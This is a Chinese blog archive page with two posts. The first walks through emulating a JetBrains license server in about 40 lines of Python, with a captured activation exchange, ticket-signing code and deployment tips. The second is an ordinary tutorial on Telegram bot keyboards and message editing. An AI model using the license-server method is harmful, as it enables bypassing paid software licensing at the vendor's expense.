<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>土豆不好吃</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="土豆不好吃">
<meta property="og:url" content="http://example.com/page/12/index.html">
<meta property="og:site_name" content="土豆不好吃">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Benny小土豆">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="土豆不好吃" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">土豆不好吃</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-jbls/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2018/02/06/jbls/index/" class="article-date">
  <time class="dt-published" datetime="2018-02-06T00:00:00.000Z" itemprop="datePublished">2018-02-06</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/program/">program</a>►<a class="article-category-link" href="/categories/program/share/">share</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2018/02/06/jbls/index/">JetBrains License Server原理及40行Python代码的实现</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Repository: [gt href&#x3D;’<a target="_blank" rel="noopener" href="https://coding.net/u/BennyThink/p/pyJetBrains/_license/_server'/]%E5%BC%80%E6%BA%90%E5%9C%B0%E5%9D%80/[/gt/]">https://coding.net/u/BennyThink/p/pyJetBrains\_license\_server&#39;\]开源地址\[/gt\]</a></p>
<p>[v_error]警告： 本文仅供学习参考，请勿用于其他用途。如果你喜欢JetBrains的产品，请购买正版授权。[&#x2F;v_error] [v_blue]近期license server升级，可以阅读官方的<a target="_blank" rel="noopener" href="https://www.jetbrains.com/license-server/outdated-ls/">这篇文章</a>，在2018.2.1（2018年第三季度左右发布）之后旧版服务器将无法使用，所以先别升级到2018.2.1，留在2018.2吧。关于新的激活服务器，似乎有点难度，欢迎各位提供任何可能会有帮助的资料和工具（包括但不限于本地激活器，license server，以及相关介绍文章和抓包记录等），更多详情请参考文末记录[&#x2F;v_blue]</p>
<p>估计是个程序员都应该使用过<a target="_blank" rel="noopener" href="https://www.jetbrains.com/">JetBrains</a>的IDE（尤其是Python程序员吧）。JetBrains的产品线非常丰富，PHP的PHPStorm，前端的Webstorm，Python的Pycharm，Java的IntelliJ，Ruby的RubyMine，Go的Goland，数据库的DataGrip……</p>
<p>几个月之前，我曾经尝试着把Java版本的License Server 移植到Python，但是失败了。但是今天我就成功了……好了不废话了，咱来一步一步的学习下怎么用40行代码写一个JetBrains License Server</p>
<h2 id="JetBrains-License-Server激活流程"><a href="#JetBrains-License-Server激活流程" class="headerlink" title="JetBrains License Server激活流程"></a>JetBrains License Server激活流程</h2><p>打开IDE，依次点击Help-Register，输入服务器地址，点击Activate</p>
<p><img src="/images/2018020602360796.png"></p>
<p>这时就会从 License Server取得一个Ticket了。</p>
<p>[v_blue]友情提示：</p>
<p>如果你有edu邮箱的话，那快去申请免费正版授权吧，哪怕你没有edu邮箱，也可以试试什么注册edu邮箱的，比如说<a target="_blank" rel="noopener" href="https://free.kirito.edu.rs/">这个</a>[&#x2F;v_blue]</p>
<h2 id="抓包与分析"><a href="#抓包与分析" class="headerlink" title="抓包与分析"></a>抓包与分析</h2><p>网上已经有人写好了几个版本的授权服务器，我参考了<a target="_blank" rel="noopener" href="https://coding.net/u/chenq_/p/license/git">Java版</a>的、<a target="_blank" rel="noopener" href="https://github.com/xczh/jetserver">golang版</a>的还有<a target="_blank" rel="noopener" href="https://github.com/springhack/JetBrains-License-Server">JavaScript版</a>的。</p>
<p>于是我找了那个能用的Java版本的，自己搭建，然后尝试激活、抓包并过滤http，进行分析。</p>
<p>通过追踪HTTP流我们能发现，IDE向指定服务器发起了一个GET请求，请求中包含很多参数，之后服务器返回了一个像是散列值，还有一小串XML</p>
<p><img src="/images/201802060236083.png"></p>
<p>IDE请求：</p>
<p>GET &#x2F;rpc&#x2F;obtainTicket.action?buildDate&#x3D;20170719&amp;buildNumber&#x3D;2017.2.2+Build+CL-172.3968.17&amp;clientVersion&#x3D;4&amp;hostName&#x3D;xxxxxxm&amp;machineId&#x3D;51xxxxx20a-14d259f1fc94&amp;productCode&#x3D;cfc7xxxx978-a2a2-46fxxxx405&amp;productFamilyId&#x3D;cfxxxx-ae43-4978-a2a2-46feb1679405&amp;salt&#x3D;1506491409302&amp;secure&#x3D;false&amp;userName&#x3D;xxxx&amp;version&#x3D;2017200&amp;versionNumber&#x3D;2017200</p>
<p>服务器返回：</p>
<!-- 61b3a2f53ffxxxxxxxxx6b132e0270275d12434f217ba3231b5 -->

<p><ObtainTicketResponse><message></message><prolongationPeriod>607875500</prolongationPeriod><responseCode>OK</responseCode><salt>1506491409302</salt><ticketId>1</ticketId><ticketProperties>licensee&#x3D;xxxxx licenseType&#x3D;0 </ticketProperties></ObtainTicketResponse></p>
<p>由此我们可以很清楚的了解到激活的步骤：请求+相应+验证，那么大体猜测一下应该是服务端持有一个私钥，对请求字符串进行加密，然后返回，客户端使用公钥验证。</p>
<h2 id="验证猜想"><a href="#验证猜想" class="headerlink" title="验证猜想"></a>验证猜想</h2><p>为了验证我们的猜想，咱其实是要去读其他版本的源代码的……鉴于这个流程挺复杂，要求你会多门语言，所以咱就不演示了……总之，经过我的研读，我发现的细节是这样的：</p>
<p>服务端构造如下的字符串：</p>
<p><ObtainTicketResponse><message></message><prolongationPeriod>607875500</prolongationPeriod><responseCode>OK</responseCode><salt>1506491409302</salt><ticketId>1</ticketId><ticketProperties>licensee&#x3D;xxxxx licenseType&#x3D;0 </ticketProperties></ObtainTicketResponse></p>
<p>其中salt是发起请求时的时间戳（单位毫秒），licensee是发起请求的用户名（其实这个用户名是随便的，在代码里写死也是可以的）。</p>
<p>然后服务器使用RSA with MD5 and PKCS1v15进行加密，把加密后的内容转换为十六进制，加上HTML注释<!-- hex -->（注意前后的两个空格），把十六进制HTML注释和构造的字符串一起返回，客户端使用hex和返回的字符串（以及公钥）进行验证。</p>
<p>其实验证猜想的这一步才是最复杂的，需要参考很多源代码做出适当的实验。</p>
<p>既然猜想已经得到了证实，那么剩下来就开始写了。基础的结构很简单，用flask搭建一个简易的服务器，用cryptography完成密码学相关的操作。</p>
<h2 id="cryptography完成RSA签名与十六进制转换"><a href="#cryptography完成RSA签名与十六进制转换" class="headerlink" title="cryptography完成RSA签名与十六进制转换"></a>cryptography完成RSA签名与十六进制转换</h2><p>Python中比较安全好用的密码学库是<a target="_blank" rel="noopener" href="https://cryptography.io/en/latest/">cryptography</a>（唉 好吧）、<a target="_blank" rel="noopener" href="https://www.dlitz.net/software/pycrypto/">pycrypto</a>（这货很久不更新了，不敢用），顺便说一句，进行安全随机盐散列函数的有<a target="_blank" rel="noopener" href="https://passlib.readthedocs.io/en/stable/index.html">passlib</a>。</p>
<p>首先需要引入对应的库</p>
<p>from cryptography.hazmat.backends import default_backend<br>from cryptography.hazmat.primitives import hashes<br>from cryptography.hazmat.primitives import serialization<br>from cryptography.hazmat.primitives.asymmetric import padding</p>
<p>然后载入key（文件形式）</p>
<p>with open(‘jbls_private_key.pem’) as f:<br>    private_key &#x3D; serialization.load_pem_private_key(f.read(), password&#x3D;None, backend&#x3D;default_backend())</p>
<p>执行加密</p>
<p>i &#x3D; bytes(content)<br>signature &#x3D; private_key.sign(i, padding.PKCS1v15(), hashes.MD5())</p>
<p>转换二进制为十六进制表达</p>
<p>binascii.hexlify(signature)</p>
<p>大概这么五行，我们就完成了加密与转换操作，剩下我们只要在Flask端做一下逻辑处理就好了。</p>
<h2 id="Flask进行逻辑处理"><a href="#Flask进行逻辑处理" class="headerlink" title="Flask进行逻辑处理"></a>Flask进行逻辑处理</h2><p>这一步也很简单，用<code>@app.route()</code>装饰器确定路由，构造字符串与返回。真的是很简单，大概就是如下这么十几行：</p>
<p>@app.route(“&#x2F;rpc&#x2F;obtainTicket.action”)<br>def obtain():<br>    salt &#x3D; request.args.get(‘salt’)<br>    user_name &#x3D; request.args.get(‘userName’)<br>    content &#x3D; “<ObtainTicketResponse><message></message>“ + \<br>        “<prolongationPeriod>607875500</prolongationPeriod><responseCode>OK</responseCode>“ + \<br>        “<salt>“ + salt + “</salt><ticketId>1</ticketId>“ \<br>        “<ticketProperties>licensee&#x3D;” + user_name + “\tlicenseType&#x3D;0\t</ticketProperties>“ \<br>        “</ObtainTicketResponse>“<br>    verification_hex &#x3D; hex_signature(content)<br>    return “<!-- " + verification\_hex + " -->\n” + content</p>
<p>通过Flask的requests拿到salt和username，构造XML，调用函数，返回hex以及XML。</p>
<p>所以加起来，整体代码真的只有不到40行。就算把KEY嵌入到源代码中，也只是43行而已……</p>
<h2 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h2><h3 id="服务端的请求日志"><a href="#服务端的请求日志" class="headerlink" title="服务端的请求日志"></a>服务端的请求日志</h3><p><img src="/images/201802060236112.png"></p>
<h3 id="客户端显示激活成功"><a href="#客户端显示激活成功" class="headerlink" title="客户端显示激活成功"></a>客户端显示激活成功</h3><p><img src="/images/2018020602361187.png"></p>
<h2 id="附录与FAQ"><a href="#附录与FAQ" class="headerlink" title="附录与FAQ"></a>附录与FAQ</h2><h3 id="监听0-0-0-0"><a href="#监听0-0-0-0" class="headerlink" title="监听0.0.0.0"></a>监听0.0.0.0</h3><p>如果想要把这个服务部署在服务器上，那么最好就监听0.0.0.0，只需要把app.run()写成 app.run(host&#x3D;’0.0.0.0’)即可。</p>
<h3 id="持久运行"><a href="#持久运行" class="headerlink" title="持久运行"></a>持久运行</h3><p>当然我们希望这个Flask程序能够长期运行而不退出，此时我们最好使用supervisor或者systemd啦，详细参考此篇<a target="_blank" rel="noopener" href="https://dmesg.app/linux-keep-running.html">《Linux 怎么让程序持续运行：简单说说几种好玩的办法》</a></p>
<h3 id="示例源代码"><a href="#示例源代码" class="headerlink" title="示例源代码"></a>示例源代码</h3><p>本示例源代码可以到下面的地址查看： [gt href&#x3D;’<a target="_blank" rel="noopener" href="https://coding.net/u/BennyThink/p/pyJetBrains/_license/_server'/]%E5%BC%80%E6%BA%90%E5%9C%B0%E5%9D%80/[/gt/]">https://coding.net/u/BennyThink/p/pyJetBrains\_license\_server&#39;\]开源地址\[/gt\]</a></p>
<p>为啥不放到GitHub呢？被DMCA Takedown啦ε&#x3D;ε&#x3D;ε&#x3D;┏(゜ロ゜;)┛</p>
<p>需要注意的是，需要使用pip安装cryptography、flask，并且jbls.py同时支持Python 2和Python 3.</p>
<h3 id="可否提供一个有效的私钥"><a href="#可否提供一个有效的私钥" class="headerlink" title="可否提供一个有效的私钥"></a>可否提供一个有效的私钥</h3><p>不好意思，不提供……至于我这个测试的私钥是在哪找的……你们猜呀。</p>
<h3 id="如何生成exe文件"><a href="#如何生成exe文件" class="headerlink" title="如何生成exe文件"></a>如何生成exe文件</h3><p>使用<a target="_blank" rel="noopener" href="http://www.pyinstaller.org/">pyinstaller</a>就可以了。</p>
<p>pyinstaller -F demo.py</p>
<h3 id="travis-ci"><a href="#travis-ci" class="headerlink" title="travis-ci"></a>travis-ci</h3><p>我们用travis-ci做持续集成测试，但是travis-ci并不是为了运行程序而准备的。但是我们这个Flask应用还必须得运行才能测试。那咋办呢？<code>subprocess.Popen()</code>？反正各种奇技淫巧都试过了，不好用的。劝大家还是试试<code>app.test_client().get(url).data</code>吧，这样就能获取到响应然后assert了。</p>
<p> </p>
<h2 id="新版JetBrains-License-Server备注"><a href="#新版JetBrains-License-Server备注" class="headerlink" title="新版JetBrains License Server备注"></a>新版JetBrains License Server备注</h2><p>以下内容全文引用自<a target="_blank" rel="noopener" href="http://blog.lanyus.com/archives/174.html/comment-page-21#comments">lanyus</a>评论</p>
<blockquote>
<p>贵站居然没有过滤html的特殊字符？重新发一下吧，以下是原文：</p>
<p>Jetbrains家产品线激活服务器认证从2018.2开始使用两个handler来处理，第一个handler会对老的签名方式进行认证（<!-- abcdef1234567890 --><ObtainTicketResponse></ObtainTicketResponse>类样式），该handler会判断签名是否包含hex之外的字符。如果没有，按老版本方式来验证签名，如果存在hex之外字符则抛异常由自己接住后进入第二个handler来验证。 从版本2018.2.1开始便去掉了第一个handler，改为只由第二个handler来验证，由此老的验证服务器全面失效。 来说说第二个handler的验证逻辑吧： 新的报文返回还是形同：<!-- sign\_body --><xxxResponse></xxxResponse>，其中<xxxResponse></xxxResponse>这样的响应正文中相比较老版本添加<serveruid>xyz</serveruid>配置，这个xyz后文中有用到，不可缺少。 sign_body格式较老版本的hex字符串变动很大，其示例格式如下：SHA1withRSA-xxxxxxxxxxxxxx-yyyyyyyyyyyyyyy，以-符号分隔，SHA1withRSA对应java中签名所使用的算法（可换为MD5withRSA等），xxxxxxxxxxxxxx部分是使用该算法以私钥签名的bin -&gt; base64字符串，yyyyyyyyyyyyyyy部分则是pem格式的证书字符串（可直接放证书正文，不换行）。 其中yyyyyyyyyyyyyyy证书必须由Jetbrains产品内置的一个CN为License Server CA的CA证书签发才有效，而且yyyyyyyyyyyyyyy证书中必须包含CN&#x3D;xyz.lsrv.jetbrains.com(其中xyz对应前文<serveruid>xyz</serveruid>部分所填)。 证书验证通过后才会取出证书中所包含的公钥来验证签名<xxxResponse></xxxResponse>响应正文（和base64Decode(xxxxxxxxxxxxxx)比对），验证通过后继续完成服务器认证（解析正文内容，逻辑同旧版）。 啰啰嗦嗦这么多，总结一下：如果我们想要自己造验证服务器，则需要拿到一张License Server CA签发的证书（包括私钥），而且这个证书被Jetbrains发现可能会被吊销！所以这个恐怕有些痴人说梦了。 对了License Server CA证书的内容由另一张Jetprofile签发的叫prod3y的证书公钥定时校验（数据格式同上文所述，不过正文部分是CA证书字符串），应该是防止被替换吧。 还有类似idea.lanyus.com这样的认证服务器域名黑名单也由这张prod3y证书公钥定时校验，也是怕被篡改吧。如果要替换CA要从替换prod3y证书开始，但那是破解的内容了，不如注册服务器优雅。 就这么多。</p>
</blockquote>
<p> </p>
<p>所以估计License Server这条路可能走不通了，只能通过javaagent这种方法修改客户端（IDE）代码然后达到目的了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2018/02/06/jbls/index/" data-id="clhp7rtgw0046s2qrch5q8bdo" data-title="JetBrains License Server原理及40行Python代码的实现" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-tgbot1/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2018/02/01/tgbot1/index/" class="article-date">
  <time class="dt-published" datetime="2018-02-01T00:00:00.000Z" itemprop="datePublished">2018-02-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/program/">program</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2018/02/01/tgbot1/index/">[Telegram bot 系列]1：requests库、Inline Keyboard、Reply Keyboard与其他细节</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>又到了一年一度写“新年首博”的时候！很高兴，本博客依然坚挺，正努力向着【三周年】庆典一天天地迈进。</p>
<h2 id="关于俺近期的静默"><a href="#关于俺近期的静默" class="headerlink" title="关于俺近期的静默"></a>关于俺近期的静默</h2><p>最近一个多月，俺确实比较忙（在前几篇博文中也多次提及这点），导致博客更新频率下降。在此，先向各位读者表示抱歉 :(</p>
<p>为了避免大伙儿无谓的担心，俺尽量把静默的时间跨度控制在【14天】之内，以表明俺自己是安全的（这是前几年在博客中做的约定）。</p>
<p>上一篇博文是在2017年最后几天发出的，昨天（1月31日）俺特地上博客回复了一些评论——所以这次静默的时间【没有】超过14天。</p>
<h2 id="小土豆机器人课程又开课啦"><a href="#小土豆机器人课程又开课啦" class="headerlink" title="小土豆机器人课程又开课啦"></a>小土豆机器人课程又开课啦</h2><p>自从三个月前发出第一篇<a target="_blank" rel="noopener" href="https://dmesg.app/tgbot0.html">《[Telegram bot 系列]0：用 Python 写一个 Telegram Bot 简单的回话 bot》</a>，这一系列就好像是史上最不受待见的系列一样：没人看，也没有啥想写的欲望，更重要的是也没时间。</p>
<p>于是乎，随着<a target="_blank" rel="noopener" href="https://t.me/bennyblog_bot">ExpressBot</a>越来越好玩，趁着这几天有时间，我决定给这一系列注入新鲜的血液，再次开课水贴，说不定本系列就这么短命的被我在此篇中终结啦♪(^∇^*)。</p>
<h2 id="机器人"><a href="#机器人" class="headerlink" title="机器人"></a>机器人</h2><p><a target="_blank" rel="noopener" href="https://twitter.com/BennyThinks/status/956079273835560960">几天前</a>被告知我的机器人上了少数派：<a target="_blank" rel="noopener" href="https://sspai.com/post/42967">《查快递、收邮件、订阅 RSS……除了聊天 Telegram 还有这些实用功能》</a>， 然后用户数量大增，导致<a target="_blank" rel="noopener" href="https://twitter.com/BennyThinks/status/956264608561377280">被快递100封IP</a>，然后……这几天抽出来时间，悄悄的给机器人加了一些改进限制。</p>
<h2 id="内联键盘（Inline-Keyboard）与回复键盘（Reply-Keyboard）"><a href="#内联键盘（Inline-Keyboard）与回复键盘（Reply-Keyboard）" class="headerlink" title="内联键盘（Inline Keyboard）与回复键盘（Reply Keyboard）"></a>内联键盘（Inline Keyboard）与回复键盘（Reply Keyboard）</h2><p>用过BotFather的人可能记得，创建机器人的时候我们能看到这样的按钮：</p>
<p><img src="/images/2018020105133426.png"></p>
<p>咱可以通过点击按钮来和服务器进行交互，有些按钮还可以是链接：</p>
<p><img src="/images/2018020105133615.png" alt="https://core.telegram.org/file/811140999/1/2JSoUVlWKa0/4fad2e2743dc8eda04"></p>
<p>上图这种方式我们称之为Inline Keyboard。点击Inline Keyboard的按钮不会造成客户端向机器人发送消息</p>
<p>还有一种与Inline Keyboard比较接近的是custom Reply Keyboard，像下图这样：</p>
<p><img src="/images/2018020105133792.jpeg" alt="https://core.telegram.org/file/811140880/1/jS-YSVkDCNQ/b397dfcefc6da0dc70"></p>
<p>用户点击文本编辑框下面的按钮，客户端就会自动为我们发送对应的消息，实际上Reply Keyboard更像是快捷回复。</p>
<p>这两种keyboard非常适合与用户进行交互（比如说游戏），并且用户不用一次性完整的输入命令、服务端一次性完成解析命令。</p>
<p>观察仔细的小伙伴们可能发现，<a target="_blank" rel="noopener" href="https://t.me/bennyblog_bot">ExpressBot</a> 的查询美剧功能突然变得更好用一些了。</p>
<p><img src="/images/2018020105133848.png"></p>
<h2 id="Reply-Keyboard数据结构及简单示例"><a href="#Reply-Keyboard数据结构及简单示例" class="headerlink" title="Reply Keyboard数据结构及简单示例"></a>Reply Keyboard数据结构及简单示例</h2><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p><img src="/images/201802010513382.png"></p>
<p>图片截图自<a target="_blank" rel="noopener" href="https://core.telegram.org/bots/api#replykeyboardmarkup">Telegram官网</a></p>
<p>我觉得大家都能看懂这是什么意思，那么就写一个简单的Reply Keyboard吧。</p>
<h3 id="简单示例1：Reply-Keyboard"><a href="#简单示例1：Reply-Keyboard" class="headerlink" title="简单示例1：Reply Keyboard"></a>简单示例1：Reply Keyboard</h3><p>为了应用Reply Keyboard，我们需要在send_xyz中给参数reply_markup传递我们自定义的键盘，其中reply_markup必须是ReplyKeyboardMarkup（自定义的键盘）、ReplyKeyboardRemove（移除键盘）或ForceReply（强制用户回复）的实例。</p>
<p>首先我们需要引入types</p>
<p>from telebot import types</p>
<p>之后直接开始写对应命令的代码就可以了：</p>
<p>@bot.message_handler(commands&#x3D;[‘start’])<br>def send_welcome(message):<br>    markup &#x3D; types.ReplyKeyboardMarkup(row_width&#x3D;2)<br>    itembtn1 &#x3D; types.KeyboardButton(‘a’)<br>    itembtn2 &#x3D; types.KeyboardButton(‘v’)<br>    itembtn3 &#x3D; types.KeyboardButton(‘d’)<br>    markup.add(itembtn1, itembtn2, itembtn3)<br>    bot.send_message(message.chat.id, “Choose one letter:”, reply_markup&#x3D;markup)</p>
<p>我们先定义了一个markup实例，设置行宽为2，然后添加avd三个按钮，之后在<code>send_message</code>的<code>reply_markup</code>中传递markup实例。如果需要点击一次就隐藏的键盘（但是依旧可以点击按钮显示），那么可以给markup构造时加入<code>one_time_keyboard=True</code>的参数。</p>
<p>[v_blue]关于row_width的注意事项： 对于ReplyKeyboard和下面即将提到的InlineKeyboard来说，如果你的程序是通过循环动态生成的button，并且在循环中迭代调用<code>markup.add(btn)</code>，那么最终只会一个按钮一排。这是因为<code>markup.add(btn1,btn2,btn3)</code>这三个才会被认为一组放到一排，而<code>markup.add(btn)</code>迭代三次会被认为是三组。在这种情况下如果想要遵循row_width的设置，那么需要将按钮append到一个列表里，然后对列表按照row_width进行切片，之后判断执行N个参数的<code>markup.add()</code>。详细的代码可以<a target="_blank" rel="noopener" href="https://github.com/BennyThink/ExpressBot/commit/853b3cec9cc0aa1f2f3b9b362650a4c91fbb4ac3">参考这段commit</a>[&#x2F;v_blue]</p>
<p><img src="/images/2018020105133948.png"></p>
<p>如果我们需要点击按钮分享电话号码、地理位置，那么可以构造按钮的时候加入对应的参数，如 <code>itembtn1 = types.KeyboardButton(&#39;a&#39;, request_contact=True)</code>，此时点击按钮，会有类似如下的提示</p>
<p><img src="/images/201802010513397.png"></p>
<h3 id="简单示例2：ReplyKeyboardRemove"><a href="#简单示例2：ReplyKeyboardRemove" class="headerlink" title="简单示例2：ReplyKeyboardRemove"></a>简单示例2：ReplyKeyboardRemove</h3><p>markup &#x3D; types.ReplyKeyboardRemove(selective&#x3D;False)<br>tb.send_message(chat_id, message, reply_markup&#x3D;markup)</p>
<p>发送这个markup会移除自定义键盘</p>
<h3 id="简单示例3：ForceReply"><a href="#简单示例3：ForceReply" class="headerlink" title="简单示例3：ForceReply"></a>简单示例3：ForceReply</h3><p>ForceReply是强制回复，就好像用户回复机器人的消息一样，使用方法也很简单：</p>
<p>markup &#x3D; types.ForceReply()<br>bot.send_message(message.chat.id, “Choose one letter:”, reply_markup&#x3D;markup)</p>
<p><img src="/images/2018020105134043.png"></p>
<h2 id="Inline-Keyboard之数据结构"><a href="#Inline-Keyboard之数据结构" class="headerlink" title="Inline Keyboard之数据结构"></a>Inline Keyboard之数据结构</h2><p><img src="/images/2018020105134013.png"></p>
<p>我猜大家也都能看懂。InlineKeyboardMarkup的构造比较简单，InlineKeyboardButton的参数要稍微复杂一点，其中比较重要的有：</p>
<ul>
<li>text 按钮上显示的文字</li>
<li>url 点击按钮时打开的url</li>
<li>callback_data 回调数据，1-64字节。</li>
</ul>
<h2 id="Inline-Keyboard之CallbackQuery与answerCallbackQuery"><a href="#Inline-Keyboard之CallbackQuery与answerCallbackQuery" class="headerlink" title="Inline Keyboard之CallbackQuery与answerCallbackQuery"></a>Inline Keyboard之CallbackQuery与answerCallbackQuery</h2><p>由于点击InlineKeyboard时并不是发送常规的命令（&#x2F;start），所以我们需要处理Callback，Telegram使用CallbackQuery来处理此类请求，其数据结构如下：</p>
<p><img src="/images/2018020105134137.png"></p>
<p>其中比较重要的有：</p>
<ul>
<li>id 唯一标识此次按钮点击</li>
<li>message 触发此次callback的消息，其数据结构为Message类型，因此可以使用message.chat.id等方法</li>
<li>data callback_data中的字符串</li>
</ul>
<p>当用户点击按钮时，按钮旁边会显示一个加载中的图标，此时建议使用answerCallbackQuery来给用户提示信息，其数据结构如下所示：</p>
<p><img src="/images/2018020105134239.png"></p>
<h2 id="Inline-Keyboard-及回调简单示例"><a href="#Inline-Keyboard-及回调简单示例" class="headerlink" title="Inline Keyboard 及回调简单示例"></a>Inline Keyboard 及回调简单示例</h2><p>说了那么多数据结构可能会有点懵?，那么还是直接上代码更爽吧~</p>
<p>首先，我们需要像往常一样，创建InlineKeyboard实例，创建键盘实例，然后在send_xyz中把markup发送过去：</p>
<p>markup &#x3D; types.InlineKeyboardMarkup()<br>btn1 &#x3D; types.InlineKeyboardButton(‘Google’, url&#x3D;’<a target="_blank" rel="noopener" href="https://www.google.com/ncr">https://www.google.com/ncr</a>‘)<br>btn2 &#x3D; types.InlineKeyboardButton(‘Action’, callback_data&#x3D;’Act Now’)<br>markup.add(btn1,btn2)<br>bot.send_message(message.chat.id, “InlineKeyboard: “, reply_markup&#x3D;markup)</p>
<p>按钮1是打开Google，按钮2需要我们处理回调，可以这么玩：</p>
<p>@bot.callback_query_handler(func&#x3D;lambda call: True)<br>def callback_handle(call):<br>    bot.answer_callback_query(call.id, ‘哎哟’)<br>    bot.send_message(call.message.chat.id, ‘You clicked %s’ % call.data)</p>
<p>把这两段结合起来，运行的话效果大概是酱紫的，我们可以看到回调函数中<code>call.data</code>就是我们在实例化InlineKeyboardButton中参数callback_data所设置的值：</p>
<p><img src="/images/2018020105134342.png"></p>
<p>如果AnswerCallbackQuery开始了showAlert的话，那么会如下弹窗：</p>
<p><img src="/images/2018020105134339.png"></p>
<h2 id="更新消息：编辑消息（editMessageText）、删除消息（deleteMessage）与编辑markup（editMessageReplyMarkup）"><a href="#更新消息：编辑消息（editMessageText）、删除消息（deleteMessage）与编辑markup（editMessageReplyMarkup）" class="headerlink" title="更新消息：编辑消息（editMessageText）、删除消息（deleteMessage）与编辑markup（editMessageReplyMarkup）"></a>更新消息：编辑消息（editMessageText）、删除消息（deleteMessage）与编辑markup（editMessageReplyMarkup）</h2><p>我们知道，Telegram的消息是可以编辑、删除的，机器人也同样可以做到。当然了，reply_markup其实也可以被编辑的，我们就来简单的做一个示例吧。</p>
<p>说到编辑、删除消息，我们只需要chat_id和message_id就可以了，那么编辑、删除大概就可以这么写：</p>
<p>@bot.message_handler(commands&#x3D;[‘start’])<br>def edit_message(message):<br>    msg_id &#x3D; bot.send_message(message.chat.id, ‘这里是原始消息’).message_id<br>    time.sleep(2)<br>    # The below comment is wrong!!!<br>    # bot.edit_message_text(‘更新了耶’, chat_id&#x3D;message.chat.id, message_id&#x3D;message.message_id)<br>    bot.edit_message_text(‘更新了耶’, message.chat.id, msg_id)</p>
<p>@bot.message_handler(commands&#x3D;[‘help’])<br>def delete_message(message):<br>    msg_id &#x3D; bot.send_message(message.chat.id, ‘这里是要被删除的消息’).message_id<br>    time.sleep(2)<br>    bot.delete_message(message.chat.id, msg_id)</p>
<p>效果如下图：</p>
<p><img src="/images/2018020105134469.png"></p>
<p>需要注意的是，很多人最开始会想当然的给message_id传递message_id参数，实际上<strong>这是错误的</strong>！如果你这么做，那么你会收到<strong>Bad Request: message can’t be edited</strong>的异常。实际上，你所传递的<strong>message实例是用户发送过来的消息</strong>（包括&#x2F;start &#x2F;help等命令），所以获取到的message_id其实也是用户消息的id，机器人怎么可能编辑用户消息嘛！所以正确的姿势是去找send_message的返回值，通过返回值就可以获取到机器人发送的message_id了。</p>
<p>当然了，另外一种hack可以这么做，只要你确定好你要编辑的消息相对于用户消息的偏移量：</p>
<p>bot.edit_message_text(‘更新了耶’, message.chat.id, message.message_id + 1)</p>
<p>还剩下一种editReplyMessageMarkup，这是用来更新reply_markup的，包括InlineKeyboard和ReplyKeyboard，基本逻辑就是构造新的markup，然后调用，以InlineKeyboard为例：</p>
<p>def edit_reply_markup(message):<br>    markup &#x3D; types.InlineKeyboardMarkup()<br>    btn1 &#x3D; types.InlineKeyboardButton(‘Apple’, url&#x3D;’<a target="_blank" rel="noopener" href="https://www.apple.com/">https://www.apple.com</a>‘)<br>    btn2 &#x3D; types.InlineKeyboardButton(‘Microsoft’, url&#x3D;’<a target="_blank" rel="noopener" href="https://www.microsoft.com/">https://www.microsoft.com</a>‘)<br>    markup.add(btn1, btn2)<br>    # use hack<br>    bot.edit_message_reply_markup(message.chat.id, message.message_id - 1, reply_markup&#x3D;markup)</p>
<p>这里引用了message_id计算偏移量，实际上我们有些时候会在callbackQuery中编辑InlineKeyboard，此时可以应用<code>call.message.message_id</code></p>
<p><img src="/images/2018020105134455.png"></p>
<p>详细的API可以<a target="_blank" rel="noopener" href="https://core.telegram.org/bots/api#updating-messages">参考这里</a></p>
